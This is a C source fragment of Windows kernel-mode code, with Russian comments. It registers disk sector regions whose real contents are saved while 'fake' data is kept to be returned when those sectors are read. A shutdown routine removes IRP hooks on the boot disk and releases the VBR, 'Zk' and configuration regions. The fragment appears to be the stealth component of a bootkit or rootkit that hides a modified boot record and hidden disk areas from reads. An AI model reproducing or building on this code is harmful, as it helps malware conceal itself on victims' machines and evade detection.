
psectors_region_t protector_add_sector_space(pdisk_info_t pDiskInfo, uint64_t sectorOffset, uint32_t size, uint64_t* pFakeRegionOffset, uint8_t* pFakeData)
{
    psectors_region_t pNewRegion = NULL;
    uint8_t* pRealData;
    USE_GLOBAL_BLOCK

    if (pDiskInfo == NULL) {
        return NULL;
    }

    // Читаем реальные сектор для восстановления при операциях записи.
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pRealData, size, NonPagedPool);
    pGlobalBlock->pCommonBlock->fncommon_dio_read_sector(pGlobalBlock->pCommonBlock->pBootDiskInfo, pRealData, size, sectorOffset);

    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pNewRegion, sizeof(sectors_region_t), NonPagedPool);
    pGlobalBlock->pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)&pGlobalBlock->pProtectorBlock->headSectorRegion, (PLIST_ENTRY)pNewRegion);

    // Читаем фейковый сектор для подмены при чтении.
    if (pFakeData == NULL) {
        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pFakeData, size, NonPagedPool);
        pNewRegion->fakeAllocated = TRUE;
    }
    if (pFakeRegionOffset != NULL) {
        pGlobalBlock->pCommonBlock->fncommon_dio_read_sector(pGlobalBlock->pCommonBlock->pBootDiskInfo, pFakeData, size, *pFakeRegionOffset);
    }

    pNewRegion->pDiskInfo = pDiskInfo;
    pNewRegion->pDeviceObject = pDiskInfo->pLowerDevice;
    pNewRegion->startOffset = sectorOffset;
    pNewRegion->size = size;
    pNewRegion->pFakeData = pFakeData;
    pNewRegion->pRealData = pRealData;
    pNewRegion->needProtect = TRUE;

    return (HANDLE)pNewRegion;
}

void protector_release(psectors_region_t pTargetRegion)
{
    psectors_region_t pHeadRegion, pRegion;
    USE_GLOBAL_BLOCK

    pHeadRegion = &pGlobalBlock->pProtectorBlock->headSectorRegion;
    pRegion = (psectors_region_t)pHeadRegion->Flink;
    while (pRegion != pHeadRegion) {
        if (pRegion == pTargetRegion) {
            pGlobalBlock->pCommonBlock->fncommon_remove_entry_list((PLIST_ENTRY)pRegion);
            if (pRegion->fakeAllocated) {
                pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pRegion->pFakeData, LOADER_TAG);
            }
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pRegion->pRealData, LOADER_TAG);
            break;
        }
        pRegion = (psectors_region_t)pRegion->Flink;
    }
}

void protector_shutdown_routine()
{
    pdisk_info_t pDiskInfo;
    USE_GLOBAL_BLOCK

    pDiskInfo = pGlobalBlock->pCommonBlock->pBootDiskInfo;

    if (pDiskInfo != NULL && pDiskInfo->pLowerDevice != NULL) {
        pGlobalBlock->pCommonBlock->fndissasm_uninstall_hook(pGlobalBlock->pProtectorBlock->pIrpInternalDevCtlHook);
        if (pGlobalBlock->pProtectorBlock->pIrpInternalDevCtlHook != pGlobalBlock->pProtectorBlock->pIrpDevCtlHook) {
            pGlobalBlock->pCommonBlock->fndissasm_uninstall_hook(pGlobalBlock->pProtectorBlock->pIrpDevCtlHook);
        }
    }

    pGlobalBlock->pProtectorBlock->fnprotector_release(pGlobalBlock->pProtectorBlock->hVBRRegion);
    pGlobalBlock->pProtectorBlock->fnprotector_release(pGlobalBlock->pProtectorBlock->hZkRegion);
    pGlobalBlock->pProtectorBlock->fnprotector_release(pGlobalBlock->pProtectorBlock->hConfRegion);

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pProtectorBlock, LOADER_TAG);
}
